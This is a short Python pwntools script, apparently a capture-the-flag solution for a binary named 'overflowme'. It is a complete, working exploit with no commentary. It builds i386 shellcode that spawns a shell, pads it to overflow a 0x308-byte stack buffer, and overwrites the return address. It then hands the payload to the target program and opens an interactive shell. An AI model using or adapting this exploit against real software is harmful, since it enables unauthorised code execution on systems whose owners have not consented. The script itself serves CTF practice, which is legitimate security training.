from pwn import *
g_local = False
shellcode = asm("sub esp,0x7f;sub esp,0x7f;sub esp,0x7f;sub esp,0x7f;sub esp,0x7f;" + shellcraft.i386.linux.sh())
overflow_len = 0x308
if g_local:
	padding = 0#x18
else:
	padding = 0#x28

payload = ("A" * (overflow_len - len(shellcode) - padding)) + shellcode + "A"*padding + p32(0x8048615) * 3

if g_local:
	#sh = gdb.debug(["./overflowme", payload], "b vuln")
	sh = process(["./overflowme", payload])
else:
	sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])

print hex(len(payload))
print payload

sh.interactive()
